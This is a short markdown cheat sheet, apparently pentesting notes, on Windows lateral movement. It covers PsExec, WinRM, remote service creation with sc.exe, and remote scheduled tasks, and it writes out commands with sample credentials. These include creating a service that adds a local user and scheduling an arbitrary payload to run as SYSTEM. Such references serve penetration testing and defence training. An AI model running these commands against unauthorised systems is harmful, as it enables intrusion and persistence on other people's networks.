# Lateral Movement and Pivoting



## Table of contents

##### ➤ Windows - Spawning a process remotely
* [1. PSEXEC](#Psexec)
* [2. Remote Process Creation Using WinRM](#Remote-Process-Creation-Using-WinRM)
* [3. Remotely Creating Services Using sc](#Remotely-Creating-Services-Using-SC)
* [4. Creating Scheduled Tasks Remotely](#Creating-Scheduled-Tasks-Remotely)

``` ```
``` ```
## Psexec

- Ports: 445/TCP (SMB)
- Required Group Memberships: Administrators
- Part of sysinternals 

#### Commands
```
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

``` ```
``` ```
## Remote Process Creation Using WinRM

- Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Remote Management Users

#### Using winrs.exe :
```
winrs.exe -u:Administrator -p:Mystrongpassword -r:target cmd
```

#### Using Powershell directly :

###### 1. create a PSCredential object :
```
$username = 'Administrator';
$password = 'Mystrongpassword';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
````

###### 2.A. Create an interactive session using Enter-PSSession cmdlet :
```
Enter-PSSession -Computername TARGET -Credential $credential
```

###### 2.B Run only a specific command 
```
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```


``` ```
``` ```
## Remotely Creating Services Using sc

- Ports:
  -  135/TCP, 49152-65535/TCP (DCE/RPC)
  - 445/TCP (RPC over SMB Named Pipes)
  - 139/TCP (RPC over SMB Named Pipes)
- Required Group Memberships: Administrators

#### 1. create and start a service named "SERVICENAME" using the following commands:
```
sc.exe \\TARGET create SERVICENAME binPath= "net user USERNAME PASSWORD /add" start= auto
sc.exe \\TARGET start SERVICENAME
```
***Notes :*** The "net user" command will be executed when the service is started, creating a new local user on the system. Since the operating system is in charge of starting the service, you won't be able to look at the command output.

####  2. Stop and delete the service
```
sc.exe \\TARGET stop SERVICENAME
sc.exe \\TARGET delete SERVICENAME
```

``` ```
``` ```
## Creating Scheduled Tasks Remotely

Another Windows feature we can use is Scheduled Tasks. You can create and run one remotely with schtasks, available in any Windows installation. 

#### Create a task named MYTASK, we can use the following commands:

```
schtasks /s TARGET /RU "SYSTEM" /create /tn "MYTASK" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/2023 /st 00:00 
schtasks /s TARGET /run /TN "MYTASK" 
```

***Notes :*** We set the schedule type (/sc) to ONCE, which means the task is intended to be run only once at the specified time and date. Since we will be running the task manually, the starting date (/sd) and starting time (/st) won't matter much anyway. Since the system will run the scheduled task, the command's output won't be available to us, making this a blind attack.


#### Delete the scheduled task
```
schtasks /S TARGET /TN "MYTASK" /DELETE /F
```
